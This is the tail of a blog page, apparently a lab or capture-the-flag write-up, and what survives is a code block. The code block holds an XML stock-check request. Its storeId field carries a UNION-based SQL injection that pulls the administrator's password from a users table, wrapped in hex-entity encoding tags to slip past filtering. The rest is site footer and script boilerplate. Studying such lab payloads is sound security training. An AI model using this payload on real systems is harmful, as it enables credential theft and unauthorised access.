</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">enconding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">	&lt;stockCheck&gt;
</span></span><span class="line"><span class="cl">		&lt;productId&gt;
</span></span><span class="line"><span class="cl">			<span class="m">2</span>
</span></span><span class="line"><span class="cl">		&lt;/productId&gt;
</span></span><span class="line"><span class="cl">		&lt;storeId&gt;
</span></span><span class="line"><span class="cl">			&lt;@hex_entities&gt;
</span></span><span class="line"><span class="cl">				<span class="m">1</span> union <span class="k">select</span> password from users where <span class="nv">username</span><span class="o">=</span><span class="s1">&#39;administrator&#39;</span>-- -
</span></span><span class="line"><span class="cl">			&lt;@/hex_entities&gt;
</span></span><span class="line"><span class="cl">		&lt;/storeId&gt;
</span></span><span class="line"><span class="cl">	&lt;/stockCheck&gt;
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    

    </footer>


    
</article>

    

    

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2023 Liv3P0ol
    </section>
    
    <section class="powerby">
        Creado con <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.20.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
